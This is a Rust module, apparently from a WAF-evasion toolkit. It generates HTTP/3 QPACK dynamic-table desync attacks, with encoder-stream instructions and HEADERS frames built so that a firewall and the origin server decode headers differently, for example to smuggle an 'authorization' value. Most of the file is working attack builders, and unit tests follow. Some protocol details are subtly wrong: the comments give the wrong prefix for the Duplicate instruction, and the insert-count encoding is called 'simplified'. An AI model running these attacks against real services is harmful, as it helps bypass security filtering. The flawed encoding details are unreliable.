//! QPACK dynamic table desync attacks (RFC 9204).
//!
//! ## QPACK compression overview
//!
//! HTTP/3 uses QPACK (RFC 9204) for header compression instead of HPACK.
//! QPACK uses two QUIC streams:
//! - **Encoder stream** (unidirectional, type 0x02): server → client instructions
//!   that insert entries into the dynamic table
//! - **Decoder stream** (unidirectional, type 0x03): client → server
//!   acknowledgements
//!
//! A "Required Insert Count" (RIC) in each HEADERS frame tells the decoder
//! which dynamic table entries are needed before the frame can be decoded.
//!
//! ## Attack: dynamic table desync
//!
//! If an attacker can inject or forge encoder stream bytes, they can:
//!
//! 1. **Insert phantom entries** — entries the WAF inserts but the server
//!    doesn't, so WAF decodes `Authorization: Bearer <token>` while the
//!    server sees a different field
//! 2. **Corrupt the insert count** — make the WAF believe RIC=N is satisfied
//!    by table entries it has, while the server's table has different entries
//!    at the same index
//! 3. **Table overflow** — insert entries that push old entries out of the
//!    WAF's table, causing future frames to decode differently at WAF vs server
//!
//! ## Attack: header field smuggling via QPACK name/value interleaving
//!
//! RFC 9204 §3.2.3 allows "Literal Field Line with Post-Base Index" — a
//! field that references a table entry that hasn't been inserted yet (a
//! forward reference, blocked until the entry arrives). If the WAF's QPACK
//! implementation doesn't correctly block on forward references, it may
//! decode the field immediately using a wrong (stale) table entry while
//! the server waits and decodes correctly once the entry arrives.
//!
//! ## Wire format reference
//!
//! Encoder stream instructions (RFC 9204 §3.2):
//! - `1xxxxxxx` — Insert With Name Reference (static or dynamic table)
//! - `01xxxxxx` — Insert With Literal Name
//! - `001xxxxx` — Duplicate (copy existing dynamic table entry)
//! - `00100000` — Set Dynamic Table Capacity

use crate::{EvasionFrame, EvasionFrameSet, EvasionTechnique};

/// QPACK desync attack variant.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum QpackDesyncVariant {
    /// Insert phantom header entries that overflow the WAF's table budget
    /// but not the server's (different max table sizes negotiated).
    PhantomInsert,
    /// Corrupt RIC (Required Insert Count) by sending a HEADERS frame
    /// with RIC referencing an entry that exists in the WAF's table
    /// (due to a previous phantom insert) but not in the server's table.
    RicDesync,
    /// Use "Literal Field Line with Post-Base Index" forward references
    /// that a buggy WAF resolves immediately with the wrong table entry.
    ForwardReference,
    /// Table capacity reset: send `Set Dynamic Table Capacity = 0` to
    /// flush the WAF's table while the server's table is unaffected
    /// (if the WAF respects the instruction but the server ignores it
    /// because it's injected in the wrong stream direction).
    CapacityFlush,
    /// Duplicate instruction flood: cause the WAF's table to drift by
    /// duplicating entries in a different order than the server sees.
    DuplicateDrift,
}

/// A QPACK encoder stream instruction (wire bytes + description).
#[derive(Debug, Clone)]
pub struct QpackInstruction {
    pub bytes: Vec<u8>,
    pub description: String,
}

/// Builder for QPACK encoder stream attack instructions.
#[derive(Debug, Clone)]
pub struct QpackEncoder {
    /// Current simulated dynamic table insert count (absolute index).
    insert_count: u64,
    /// Max dynamic table capacity in bytes — used for capacity-overflow
    /// attack planning (entries pushed out once this budget is exhausted).
    pub max_capacity: u32,
}

impl QpackEncoder {
    pub fn new(max_capacity: u32) -> Self {
        Self {
            insert_count: 0,
            max_capacity,
        }
    }

    /// RFC 9204 §3.2.1 — Insert With Literal Name.
    ///
    /// Instruction: `01 N 0 xxxxxxx | name_len | name | value_len | value`
    /// `N` = never-index bit (0 = indexable).
    pub fn insert_literal(&mut self, name: &str, value: &str) -> QpackInstruction {
        let mut bytes = Vec::new();
        // First byte: `01` prefix (bits 7:6), N=0 (bit 5), name_length hpack-style
        // RFC 9204 uses QPACK integer encoding (RFC 9204 §1.3 = same as HPACK).
        let name_b = name.as_bytes();
        let val_b = value.as_bytes();
        // 0b01_0_XXXXX — first byte prefix 0x40, never-index=0
        bytes.push(0x40 | encode_int_first_byte(name_b.len() as u64, 5));
        bytes.extend_from_slice(&encode_int_tail(name_b.len() as u64, 5));
        bytes.extend_from_slice(name_b);
        // Value: not Huffman-encoded (bit 7 = 0)
        bytes.push(encode_int_first_byte(val_b.len() as u64, 7));
        bytes.extend_from_slice(&encode_int_tail(val_b.len() as u64, 7));
        bytes.extend_from_slice(val_b);
        self.insert_count += 1;
        QpackInstruction {
            bytes,
            description: format!("Insert literal: {}:{} (entry #{})", name, value, self.insert_count),
        }
    }

    /// RFC 9204 §3.2.4 — Set Dynamic Table Capacity.
    ///
    /// Instruction: `001 XXXXX` with the new capacity value.
    pub fn set_capacity(&self, capacity: u32) -> QpackInstruction {
        let mut bytes = Vec::new();
        // Prefix: 0b001_XXXXX = 0x20
        bytes.push(0x20 | encode_int_first_byte(capacity as u64, 5));
        bytes.extend_from_slice(&encode_int_tail(capacity as u64, 5));
        QpackInstruction {
            bytes,
            description: format!("Set dynamic table capacity: {}", capacity),
        }
    }

    /// RFC 9204 §3.2.3 — Duplicate (copy dynamic table entry at `index`).
    ///
    /// Instruction: `000 XXXXX` with the relative index.
    pub fn duplicate(&self, relative_index: u64) -> QpackInstruction {
        let mut bytes = Vec::new();
        // Prefix: 0b000_XXXXX = 0x00
        bytes.push(0x00 | encode_int_first_byte(relative_index, 5));
        bytes.extend_from_slice(&encode_int_tail(relative_index, 5));
        QpackInstruction {
            bytes,
            description: format!("Duplicate dynamic table entry @{}", relative_index),
        }
    }

    /// RFC 9204 §3.2.2 — Insert With Name Reference (from static table).
    ///
    /// Instruction: `1 T XXXXXXX` where T=1 means static table reference.
    pub fn insert_with_static_ref(&mut self, static_index: u64, value: &str) -> QpackInstruction {
        let mut bytes = Vec::new();
        // 0b1_1_XXXXXX = 0xC0, T=1 (static)
        bytes.push(0xC0 | encode_int_first_byte(static_index, 6));
        bytes.extend_from_slice(&encode_int_tail(static_index, 6));
        let val_b = value.as_bytes();
        bytes.push(encode_int_first_byte(val_b.len() as u64, 7));
        bytes.extend_from_slice(&encode_int_tail(val_b.len() as u64, 7));
        bytes.extend_from_slice(val_b);
        self.insert_count += 1;
        QpackInstruction {
            bytes,
            description: format!(
                "Insert with static ref [{}] = '{}' (entry #{})",
                static_index, value, self.insert_count
            ),
        }
    }

    /// Current insert count (= absolute table size in entries inserted so far).
    pub fn insert_count(&self) -> u64 {
        self.insert_count
    }

    /// Estimate how many additional entries of `avg_entry_bytes` size fit
    /// before the dynamic table capacity is exhausted.  Used by attack
    /// builders to compute a realistic `n_phantom` value without exceeding
    /// the WAF's configured table budget.
    pub fn remaining_capacity_entries(&self, avg_entry_bytes: u32) -> u32 {
        let entry_overhead: u32 = 32; // RFC 9204 §3.2.1 mandates a 32-byte per-entry overhead
        let per_entry = avg_entry_bytes.saturating_add(entry_overhead);
        if per_entry == 0 {
            return 0;
        }
        self.max_capacity / per_entry
    }
}

/// A complete QPACK desync attack, producing encoder stream instructions
/// and a spoofed HEADERS frame that will decode differently at the WAF
/// vs the server.
#[derive(Debug, Clone)]
pub struct QpackDesyncAttack {
    pub variant: QpackDesyncVariant,
    /// Encoder stream instructions to send before the HEADERS frame.
    pub encoder_stream_bytes: Vec<u8>,
    /// The HEADERS frame body (field block) to send on the request stream.
    /// This is NOT a complete HTTP/3 HEADERS frame — it is the field block
    /// payload, which the caller wraps in an HTTP/3 HEADERS frame (type 0x01).
    pub headers_field_block: Vec<u8>,
    pub description: String,
}

impl QpackDesyncAttack {
    /// Build a phantom-insert desync attack.
    ///
    /// Inserts `n_phantom` entries into the WAF's dynamic table via the
    /// encoder stream, then sends a HEADERS frame whose RIC references those
    /// entries. If the server's table doesn't have them (because the encoder
    /// stream was injected/replayed), the WAF decodes malicious headers while
    /// the server waits forever (blocked on RIC) or decodes differently.
    pub fn phantom_insert(n_phantom: usize, attack_header: (&str, &str)) -> Self {
        let mut enc = QpackEncoder::new(4096);
        let mut encoder_stream = Vec::new();
        // Cap phantom entries to the table's remaining capacity so that the
        // attack doesn't spuriously evict its own entries before referencing
        // them in the HEADERS frame.
        let max_phantoms = enc.remaining_capacity_entries(32) as usize;
        let n_phantom = n_phantom.min(max_phantoms.max(1));
        // Insert phantom entries.
        for i in 0..n_phantom {
            let name = format!("x-phantom-{}", i);
            let value = format!("phantom-value-{}", i);
            let instr = enc.insert_literal(&name, &value);
            encoder_stream.extend_from_slice(&instr.bytes);
        }
        // Insert the actual attack header.
        let (attack_name, attack_value) = attack_header;
        let instr = enc.insert_literal(attack_name, attack_value);
        encoder_stream.extend_from_slice(&instr.bytes);
        // Build a HEADERS field block that references the dynamic table entry
        // for the attack header (relative index 0 = most recently inserted).
        // RFC 9204 §3.2.6 — Indexed Field Line with Dynamic Table
        // Prefix: `1 0 XXXXXX` where bit 6=0 means dynamic table.
        let mut field_block = Vec::new();
        // Required Insert Count (S bit encodes whether it's > max_entries/2)
        let ric = enc.insert_count();
        // Encoded RIC = (ric % (2 * max_blocked + 2)), simplified here.
        field_block.push(encode_int_first_byte(ric, 8)); // simplified
        field_block.extend_from_slice(&encode_int_tail(ric, 8));
        // Sign bit = 0 (positive base)
        field_block.push(0x00);
        // Indexed field line (dynamic, relative index = 0).
        field_block.push(0x80); // `1 0 XXXXXX` with index=0

        QpackDesyncAttack {
            variant: QpackDesyncVariant::PhantomInsert,
            encoder_stream_bytes: encoder_stream,
            headers_field_block: field_block,
            description: format!(
                "QPACK phantom-insert desync: {} phantom entries + attack header {}:{}",
                n_phantom, attack_name, attack_value
            ),
        }
    }

    /// Build a capacity-flush attack.
    ///
    /// Sends `Set Dynamic Table Capacity = 0` on the encoder stream,
    /// which a conformant decoder must apply (evicting all entries).
    /// Then immediately sends a HEADERS frame with a high RIC — a WAF
    /// that processes capacity changes asynchronously may still have
    /// stale entries and decode the frame differently.
    pub fn capacity_flush(attack_header: (&str, &str)) -> Self {
        let mut enc = QpackEncoder::new(4096);
        let mut encoder_stream = Vec::new();
        let (name, value) = attack_header;

        // First, insert the attack entry.
        let insert_instr = enc.insert_literal(name, value);
        encoder_stream.extend_from_slice(&insert_instr.bytes);

        // Then flush the table to zero capacity.
        let flush_instr = enc.set_capacity(0);
        encoder_stream.extend_from_slice(&flush_instr.bytes);

        // A correctly-implemented decoder evicts the entry; a buggy
        // WAF retains it. HEADERS frame references the (now-evicted) entry.
        let mut field_block = Vec::new();
        let ric = enc.insert_count();
        field_block.push(encode_int_first_byte(ric, 8));
        field_block.extend_from_slice(&encode_int_tail(ric, 8));
        field_block.push(0x00); // sign bit
        field_block.push(0x80); // indexed dynamic, index=0

        QpackDesyncAttack {
            variant: QpackDesyncVariant::CapacityFlush,
            encoder_stream_bytes: encoder_stream,
            headers_field_block: field_block,
            description: format!(
                "QPACK capacity-flush desync: insert {}:{} then flush to 0",
                name, value
            ),
        }
    }

    /// Build a duplicate-drift attack.
    ///
    /// Sends Duplicate instructions in an order that causes the WAF's and
    /// server's dynamic tables to diverge: after N duplicate operations,
    /// a given absolute index points to a different entry in each table.
    pub fn duplicate_drift(n_drifts: usize, attack_header: (&str, &str)) -> Self {
        let mut enc = QpackEncoder::new(4096);
        let mut encoder_stream = Vec::new();
        let (name, value) = attack_header;

        // Insert a decoy first.
        let decoy = enc.insert_literal("x-decoy", "harmless");
        encoder_stream.extend_from_slice(&decoy.bytes);

        // Insert the attack header.
        let attack = enc.insert_literal(name, value);
        encoder_stream.extend_from_slice(&attack.bytes);

        // Duplicate the decoy N times — this shifts all relative indices.
        for i in 0..n_drifts {
            // Relative index of the decoy (which was inserted before attack).
            // After inserting decoy (count=1) and attack (count=2), decoy's
            // relative index is 1 (most recent = 0 = attack).
            let dup = enc.duplicate((i % 2) as u64);
            encoder_stream.extend_from_slice(&dup.bytes);
        }

        let mut field_block = Vec::new();
        let ric = enc.insert_count();
        field_block.push(encode_int_first_byte(ric, 8));
        field_block.extend_from_slice(&encode_int_tail(ric, 8));
        field_block.push(0x00);
        field_block.push(0x80); // index=0 = most recently inserted

        QpackDesyncAttack {
            variant: QpackDesyncVariant::DuplicateDrift,
            encoder_stream_bytes: encoder_stream,
            headers_field_block: field_block,
            description: format!(
                "QPACK duplicate-drift desync: {} drifts, attack {}:{}",
                n_drifts, name, value
            ),
        }
    }

    /// Convert this attack into an `EvasionFrameSet`.
    ///
    /// - Frame 0: encoder stream bytes (send on unidirectional stream type 0x02)
    /// - Frame 1: HTTP/3 HEADERS frame wrapping the field block (send on
    ///   bidirectional request stream)
    pub fn to_frame_set(&self) -> EvasionFrameSet {
        let mut frames = Vec::new();
        // Encoder stream frame (QUIC unidirectional stream type=2).
        if !self.encoder_stream_bytes.is_empty() {
            frames.push(EvasionFrame {
                bytes: self.encoder_stream_bytes.clone(),
                description: format!("{} — encoder stream instructions", self.description),
                technique: EvasionTechnique::QpackDesync,
                stream_id: 2, // unidirectional encoder stream
            });
        }
        // HTTP/3 HEADERS frame (type=0x01).
        let h3_headers = http3_headers_frame(&self.headers_field_block);
        frames.push(EvasionFrame {
            bytes: h3_headers,
            description: format!("{} — HEADERS frame", self.description),
            technique: EvasionTechnique::QpackDesync,
            stream_id: 0, // request stream
        });
        EvasionFrameSet {
            frames,
            technique: EvasionTechnique::QpackDesync,
            description: self.description.clone(),
        }
    }
}

// ── Wire format helpers ───────────────────────────────────────────────────

/// QPACK/HPACK variable-length integer encoding (RFC 9204 §1.3).
///
/// Returns the first-byte contribution (the low N bits of the first byte).
/// If value < 2^N - 1, this is the complete encoding.
fn encode_int_first_byte(value: u64, prefix_bits: u8) -> u8 {
    let max_prefix = (1u64 << prefix_bits) - 1;
    if value < max_prefix {
        value as u8
    } else {
        max_prefix as u8 // signal: more bytes follow
    }
}

/// Returns additional bytes needed after the first byte (empty if value fits).
fn encode_int_tail(value: u64, prefix_bits: u8) -> Vec<u8> {
    let max_prefix = (1u64 << prefix_bits) - 1;
    if value < max_prefix {
        return Vec::new();
    }
    let mut remainder = value - max_prefix;
    let mut out = Vec::new();
    loop {
        if remainder < 128 {
            out.push(remainder as u8);
            break;
        }
        out.push((remainder as u8 & 0x7F) | 0x80);
        remainder >>= 7;
    }
    out
}

/// Wrap a QPACK field block in an HTTP/3 HEADERS frame (type = 0x01).
///
/// HTTP/3 frame layout: `type (varint) | length (varint) | payload`
///
/// The length field is encoded as a full QUIC variable-length integer (RFC 9000
/// §16) supporting all four encoding widths (1, 2, 4, 8 bytes). The previous
/// implementation only handled 1-byte (`< 64`) and 2-byte (`< 16384`) forms,
/// silently corrupting the length field for field blocks of 16384+ bytes by
/// overflowing the 14-bit 2-byte varint capacity.
fn http3_headers_frame(field_block: &[u8]) -> Vec<u8> {
    let mut buf = Vec::new();
    // Frame type = 0x01 (HEADERS)
    buf.push(0x01);
    // Frame length: full QUIC varint, all four widths supported.
    buf.extend_from_slice(&crate::quic_cid::quic_varint(field_block.len() as u64));
    buf.extend_from_slice(field_block);
    buf
}

/// Decode a QPACK variable-length integer from `bytes` at position `pos`.
/// Returns (value, bytes_consumed).
pub fn decode_qpack_int(bytes: &[u8], pos: usize, prefix_bits: u8) -> Option<(u64, usize)> {
    if pos >= bytes.len() {
        return None;
    }
    let mask = (1u8 << prefix_bits) - 1;
    let first = (bytes[pos] & mask) as u64;
    let max_prefix = mask as u64;
    if first < max_prefix {
        return Some((first, 1));
    }
    // Multi-byte
    let mut value = max_prefix;
    let mut shift = 0u32;
    let mut i = pos + 1;
    loop {
        if i >= bytes.len() {
            return None;
        }
        let b = bytes[i];
        value += ((b & 0x7F) as u64) << shift;
        shift += 7;
        i += 1;
        if b & 0x80 == 0 {
            break;
        }
        if shift > 56 {
            return None; // overflow guard
        }
    }
    Some((value, i - pos))
}

// ── Tests ─────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── Integer encoding ──────────────────────────────────────────────────

    #[test]
    fn encode_int_small_value_fits_in_prefix() {
        // 5-bit prefix, value=10 < 31 → fits in first byte alone
        assert_eq!(encode_int_first_byte(10, 5), 10);
        assert!(encode_int_tail(10, 5).is_empty());
    }

    #[test]
    fn encode_int_max_prefix_triggers_multibyte() {
        // 5-bit prefix, value=31 → max prefix = signals continuation
        assert_eq!(encode_int_first_byte(31, 5), 31);
        let tail = encode_int_tail(31, 5);
        assert_eq!(tail, vec![0x00]); // 31 - 31 = 0 → single zero byte
    }

    #[test]
    fn encode_int_large_value() {
        // 5-bit prefix, value=1337 → multi-byte
        let first = encode_int_first_byte(1337, 5);
        assert_eq!(first, 31); // saturates
        let tail = encode_int_tail(1337, 5);
        assert!(!tail.is_empty());
    }

    #[test]
    fn decode_qpack_int_small() {
        // Single byte, 5-bit prefix, value=10
        let bytes = &[10u8];
        let (val, consumed) = decode_qpack_int(bytes, 0, 5).unwrap();
        assert_eq!(val, 10);
        assert_eq!(consumed, 1);
    }

    #[test]
    fn decode_qpack_int_roundtrip() {
        // Encode 1337 with 5-bit prefix, then decode.
        let mut buf = Vec::new();
        buf.push(0x00 | encode_int_first_byte(1337, 5)); // prefix bits cleared
        buf.extend_from_slice(&encode_int_tail(1337, 5));
        let (val, _) = decode_qpack_int(&buf, 0, 5).unwrap();
        assert_eq!(val, 1337, "roundtrip encode/decode must preserve value");
    }

    // ── HTTP/3 frame wrapping ─────────────────────────────────────────────

    #[test]
    fn http3_headers_frame_type_is_0x01() {
        let field_block = b"hello";
        let frame = http3_headers_frame(field_block);
        assert_eq!(frame[0], 0x01, "HEADERS frame type must be 0x01");
    }

    #[test]
    fn http3_headers_frame_length_matches_payload() {
        let field_block = b"hello";
        let frame = http3_headers_frame(field_block);
        let length = frame[1] as usize;
        assert_eq!(length, field_block.len());
        assert_eq!(&frame[2..], field_block);
    }

    #[test]
    fn http3_headers_frame_large_payload_uses_2byte_length() {
        let field_block = vec![0u8; 100];
        let frame = http3_headers_frame(&field_block);
        assert_eq!(frame[0], 0x01); // type
        // 2-byte varint prefix: RFC 9000 §16 — 64..=16383 uses `01` high bits.
        assert_eq!(frame[1] >> 6, 1, "100-byte payload must use 2-byte varint (01 prefix)");
    }

    #[test]
    fn http3_headers_frame_16384_byte_payload_uses_4byte_length() {
        // Pre-fix: field blocks >= 16384 bytes overflowed the 2-byte varint
        // (14-bit capacity = 16383 max), silently corrupting the length field.
        // The frame would declare length = (16384 >> 8) & 0xFF = 0x40 OR'd into
        // 0x40 = 0x40, then low byte 0x00 — encoding only 2 bytes but the value
        // 0x4000 = 16384 as a QUIC varint requires 4 bytes (0x80 prefix flag).
        let field_block = vec![0u8; 16384];
        let frame = http3_headers_frame(&field_block);
        assert_eq!(frame[0], 0x01); // type
        // Must use 4-byte varint: `10` prefix (high 2 bits = 0b10).
        assert_eq!(frame[1] >> 6, 2, "16384-byte payload must use 4-byte varint (10 prefix)");
        // The 4 length bytes encode 16384 = 0x4000.
        // With 4-byte quic_varint: 0x80 | (16384>>24)=0x80, then 0x00, 0x40, 0x00.
        let len_encoded = u32::from_be_bytes([frame[1], frame[2], frame[3], frame[4]]);
        let decoded_len = (len_encoded & 0x3FFF_FFFF) as usize;
        assert_eq!(decoded_len, 16384, "decoded frame length must be 16384");
        // Total frame size: 1 (type) + 4 (length varint) + 16384 (payload)
        assert_eq!(frame.len(), 1 + 4 + 16384);
    }

    // ── QpackEncoder ──────────────────────────────────────────────────────

    #[test]
    fn qpack_encoder_insert_literal_increments_count() {
        let mut enc = QpackEncoder::new(4096);
        assert_eq!(enc.insert_count(), 0);
        enc.insert_literal("x-test", "value");
        assert_eq!(enc.insert_count(), 1);
        enc.insert_literal("x-test2", "value2");
        assert_eq!(enc.insert_count(), 2);
    }

    #[test]
    fn qpack_encoder_insert_literal_prefix_byte() {
        let mut enc = QpackEncoder::new(4096);
        let instr = enc.insert_literal("x-t", "v");
        // First byte must have `01` high bits (0x40 base).
        assert_eq!(instr.bytes[0] & 0xC0, 0x40, "insert literal prefix must be 01xxxxxx");
    }

    #[test]
    fn qpack_encoder_set_capacity_prefix() {
        let enc = QpackEncoder::new(4096);
        let instr = enc.set_capacity(1024);
        // First byte: `001` prefix = 0x20 base
        assert_eq!(instr.bytes[0] & 0xE0, 0x20, "set capacity prefix must be 001xxxxx");
    }

    #[test]
    fn qpack_encoder_duplicate_prefix() {
        let enc = QpackEncoder::new(4096);
        let instr = enc.duplicate(0);
        // First byte: `000` prefix = 0x00 base
        assert_eq!(instr.bytes[0] & 0xE0, 0x00, "duplicate prefix must be 000xxxxx");
    }

    #[test]
    fn qpack_encoder_insert_static_ref_prefix() {
        let mut enc = QpackEncoder::new(4096);
        let instr = enc.insert_with_static_ref(1, "custom");
        // First byte: `11` high bits = 0xC0 base
        assert_eq!(instr.bytes[0] & 0xC0, 0xC0, "insert-with-static-ref prefix must be 11xxxxxx");
    }

    // ── Phantom-insert attack ─────────────────────────────────────────────

    #[test]
    fn phantom_insert_attack_constructs() {
        let attack = QpackDesyncAttack::phantom_insert(3, ("authorization", "Bearer evil"));
        assert_eq!(attack.variant, QpackDesyncVariant::PhantomInsert);
        assert!(!attack.encoder_stream_bytes.is_empty());
        assert!(!attack.headers_field_block.is_empty());
        assert!(attack.description.contains("phantom-insert"));
    }

    #[test]
    fn phantom_insert_encoder_stream_grows_with_n() {
        let small = QpackDesyncAttack::phantom_insert(1, ("x-a", "v1"));
        let large = QpackDesyncAttack::phantom_insert(10, ("x-a", "v1"));
        assert!(
            large.encoder_stream_bytes.len() > small.encoder_stream_bytes.len(),
            "more phantom inserts must produce more encoder stream bytes"
        );
    }

    #[test]
    fn phantom_insert_to_frame_set_has_two_frames() {
        let attack = QpackDesyncAttack::phantom_insert(2, ("x-hack", "val"));
        let fs = attack.to_frame_set();
        assert_eq!(fs.frames.len(), 2, "must produce encoder + headers frames");
        assert_eq!(fs.frames[0].stream_id, 2, "encoder stream must be stream 2");
        assert_eq!(fs.frames[1].stream_id, 0, "headers must be on stream 0");
    }

    // ── Capacity-flush attack ─────────────────────────────────────────────

    #[test]
    fn capacity_flush_attack_constructs() {
        let attack = QpackDesyncAttack::capacity_flush(("x-evil", "payload"));
        assert_eq!(attack.variant, QpackDesyncVariant::CapacityFlush);
        assert!(!attack.encoder_stream_bytes.is_empty());
        assert!(attack.description.contains("capacity-flush"));
    }

    #[test]
    fn capacity_flush_encoder_stream_contains_zero_capacity() {
        let attack = QpackDesyncAttack::capacity_flush(("x", "y"));
        // The set_capacity(0) instruction must produce a `001 00000` byte = 0x20
        // (since 0 < 2^5-1 = 31, it fits in the prefix).
        assert!(
            attack.encoder_stream_bytes.iter().any(|&b| b == 0x20),
            "encoder stream must contain set-capacity-0 instruction (0x20)"
        );
    }

    // ── Duplicate-drift attack ────────────────────────────────────────────

    #[test]
    fn duplicate_drift_constructs() {
        let attack = QpackDesyncAttack::duplicate_drift(5, ("x-drift", "drifted"));
        assert_eq!(attack.variant, QpackDesyncVariant::DuplicateDrift);
        assert!(!attack.encoder_stream_bytes.is_empty());
    }

    #[test]
    fn duplicate_drift_encoder_stream_grows_with_drifts() {
        let small = QpackDesyncAttack::duplicate_drift(1, ("x", "y"));
        let large = QpackDesyncAttack::duplicate_drift(8, ("x", "y"));
        assert!(large.encoder_stream_bytes.len() > small.encoder_stream_bytes.len());
    }
}
